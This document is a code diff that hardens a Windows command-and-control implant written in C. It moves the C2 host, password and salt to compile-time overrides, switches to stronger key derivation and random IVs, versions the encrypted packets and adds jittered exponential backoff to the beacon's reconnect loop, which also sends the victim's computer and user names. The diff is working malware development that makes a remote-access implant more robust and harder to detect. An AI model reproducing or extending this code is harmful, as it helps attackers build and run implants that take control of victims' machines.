@@ -22,16 +22,17 @@
 #pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "advapi32.lib")
 
+/* Override via -DC2_HOST="..." -DC2_PORT=... -DC2_PASS="..." -DC2_SALT="..." at compile time */
 #define C2_HOST "127.0.0.1"
 #define C2_PORT 4443
-#define C2_PASS "whisper_secret_key"
+#define C2_PASS ""
+#define C2_SALT ""
 #define RECONNECT_DELAY 10000
 #define KEY_LEN 32
 #define IV_LEN 16
 #define TAG_LEN 16
-#define SALT "whisper_salt_2024"
-#define SALT_LEN 17
-#define PBKDF2_ITER 100000
+#define SALT_LEN 32
+#define PBKDF2_ITER 600000
 #define MAX_MSG 262144
 
 static BCRYPT_ALG_HANDLE hMacAlg = NULL;
@@ -63,9 +64,15 @@ int hmac_sha256(const BYTE *key, DWORD key_len, const BYTE *data, DWORD data_len
 
 int derive_key(const char *password, BYTE *key_out) {
     DWORD pass_len = (DWORD)strlen(password);
-    BYTE *salt = (BYTE*)SALT;
+    BYTE *salt = (BYTE*)C2_SALT;
+    DWORD salt_len = (DWORD)strlen(C2_SALT);
+    if (salt_len == 0) {
+        /* fallback: use empty salt warning */
+        salt = (BYTE*)"";
+        salt_len = 0;
+    }
     return BCryptDeriveKeyPBKDF2(hMacAlg, (PUCHAR)password, pass_len, NULL,
-        salt, SALT_LEN, PBKDF2_ITER, key_out, KEY_LEN, 0) == 0;
+        salt, salt_len, PBKDF2_ITER, key_out, KEY_LEN, 0) == 0;
 }
 
 /* Simple base64 encoder */
@@ -114,8 +121,11 @@ char *encrypt_message(const BYTE *key, const char *plain, int plain_len) {
     BYTE *keystream = NULL;
     char *result = NULL;
 
-    /* Generate random IV */
-    for (int i = 0; i < IV_LEN; i++) iv[i] = (BYTE)(rand() ^ (rand() << 8));
+    /* Generate random IV using BCryptGenRandom */
+    if (BCryptGenRandom(NULL, iv, IV_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG) != 0) {
+        /* fallback */
+        for (int i = 0; i < IV_LEN; i++) iv[i] = (BYTE)(rand() ^ (rand() << 8));
+    }
 
     /* Generate keystream: HMAC-SHA256(key, IV || counter) for each block */
     int ks_len = plain_len;
@@ -131,7 +141,6 @@ char *encrypt_message(const BYTE *key, const char *plain, int plain_len) {
         ctr_buf[5] = (BYTE)((ctr >> 16) & 0xFF);
         ctr_buf[6] = (BYTE)((ctr >> 8) & 0xFF);
         ctr_buf[7] = (BYTE)(ctr & 0xFF);
-        /* Build buffer: IV || ctr_buf */
         BYTE buf[IV_LEN + 8];
         memcpy(buf, iv, IV_LEN);
         memcpy(buf + IV_LEN, ctr_buf, 8);
@@ -156,19 +165,20 @@ char *encrypt_message(const BYTE *key, const char *plain, int plain_len) {
     memcpy(tag, hmac_out, TAG_LEN);
     free(tag_input);
 
-    /* Assemble: IV + tag + ct */
-    BYTE *packet = (BYTE*)malloc(IV_LEN + TAG_LEN + plain_len);
+    /* Assemble: version_byte + IV + tag + ct */
+    BYTE *packet = (BYTE*)malloc(1 + IV_LEN + TAG_LEN + plain_len);
     if (!packet) { free(ct); goto cleanup; }
-    memcpy(packet, iv, IV_LEN);
-    memcpy(packet + IV_LEN, tag, TAG_LEN);
-    memcpy(packet + IV_LEN + TAG_LEN, ct, plain_len);
+    packet[0] = 0;  /* cipher version: HMAC stream */
+    memcpy(packet + 1, iv, IV_LEN);
+    memcpy(packet + 1 + IV_LEN, tag, TAG_LEN);
+    memcpy(packet + 1 + IV_LEN + TAG_LEN, ct, plain_len);
     free(ct);
 
     /* Base64 encode */
-    DWORD b64_len = 0;
-    b64encode(packet, IV_LEN + TAG_LEN + plain_len, NULL, &b64_len);
+    DWORD pkt_len = 1 + IV_LEN + TAG_LEN + plain_len;
+    b64encode(packet, pkt_len, NULL, &b64_len);
     result = (char*)malloc(b64_len + 1);
-    if (result) b64encode(packet, IV_LEN + TAG_LEN + plain_len, result, &b64_len);
+    if (result) b64encode(packet, pkt_len, result, &b64_len);
     free(packet);
 
 cleanup:
@@ -176,17 +186,18 @@ cleanup:
     return result;
 }
 
-/* Decrypt: input is base64(IV + tag + ct), returns malloc'd plaintext */
+/* Decrypt: input is base64(version + IV + tag + ct), returns malloc'd plaintext */
 char *decrypt_message(const BYTE *key, const char *b64_input, DWORD b64_len, int *plain_len_out) {
     BYTE *decoded = (BYTE*)malloc(b64_len);
     DWORD dec_len = 0;
     if (!decoded || !b64decode(b64_input, b64_len, decoded, &dec_len)) { free(decoded); return NULL; }
-    if (dec_len < IV_LEN + TAG_LEN) { free(decoded); return NULL; }
+    if (dec_len < 1 + IV_LEN + TAG_LEN) { free(decoded); return NULL; }
+    if (decoded[0] != 0) { free(decoded); return NULL; }  /* unknown cipher version */
 
-    BYTE *iv = decoded;
-    BYTE *tag = decoded + IV_LEN;
-    BYTE *ct = decoded + IV_LEN + TAG_LEN;
-    int ct_len = dec_len - IV_LEN - TAG_LEN;
+    BYTE *iv = decoded + 1;
+    BYTE *tag = decoded + 1 + IV_LEN;
+    BYTE *ct = decoded + 1 + IV_LEN + TAG_LEN;
+    int ct_len = dec_len - 1 - IV_LEN - TAG_LEN;
 
     /* Verify tag */
     BYTE *tag_input = (BYTE*)malloc(IV_LEN + ct_len);
@@ -347,9 +358,19 @@ int main(void) {
     if (!crypto_init()) return 1;
     if (!derive_key(C2_PASS, key)) { crypto_cleanup(); return 1; }
 
+    int attempt = 0;
     while (1) {
         SOCKET s = connect_c2();
-        if (s == INVALID_SOCKET) { Sleep(RECONNECT_DELAY); continue; }
+        if (s == INVALID_SOCKET) {
+            DWORD delay = (DWORD)(RECONNECT_DELAY * (1 << attempt));
+            if (delay > 3600000) delay = 3600000;
+            /* add ~10% jitter */
+            delay += (DWORD)((rand() % (delay / 10 + 1)));
+            Sleep(delay);
+            attempt++;
+            continue;
+        }
+        attempt = 0;
 
         /* Send init message (encrypted) */
         char computer[64], username[64];
